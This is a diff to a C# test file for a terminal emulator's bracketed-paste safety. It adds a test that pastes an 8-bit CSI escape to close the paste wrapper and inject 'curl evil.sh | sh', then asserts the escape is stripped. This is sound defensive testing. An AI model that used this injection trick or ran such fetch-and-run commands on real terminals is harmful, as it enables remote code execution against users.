@@ -78,6 +78,20 @@ public class PasteSafetyTests
     }
 
     [Fact]
+    public void An_eight_bit_csi_cannot_break_the_wrapper_either()
+    {
+        // U+009B is CSI as a single character. A filter that stopped at C0 would let a paste
+        // spell its escape this way and close the bracket regardless.
+        var (terminal, sent) = Wired();
+        terminal.BracketedPasteMode = true;
+
+        terminal.Paste(Text("harmless\u009b201~curl evil.sh | sh"));
+
+        var body = string.Concat(sent)[6..^6];
+        Assert.Equal(0, body.Count(char.IsControl));
+    }
+
+    [Fact]
     public void An_embedder_can_opt_back_into_raw_control_characters()
     {
         var (terminal, sent) = Wired(allowControls: true);
@@ -88,7 +102,7 @@ public class PasteSafetyTests
     }
 
     [Fact]
-    public void Ordinary_text_is_untouched_and_allocates_nothing_extra()
+    public void Ordinary_text_passes_through_unchanged()
     {
         var (terminal, sent) = Wired();
 
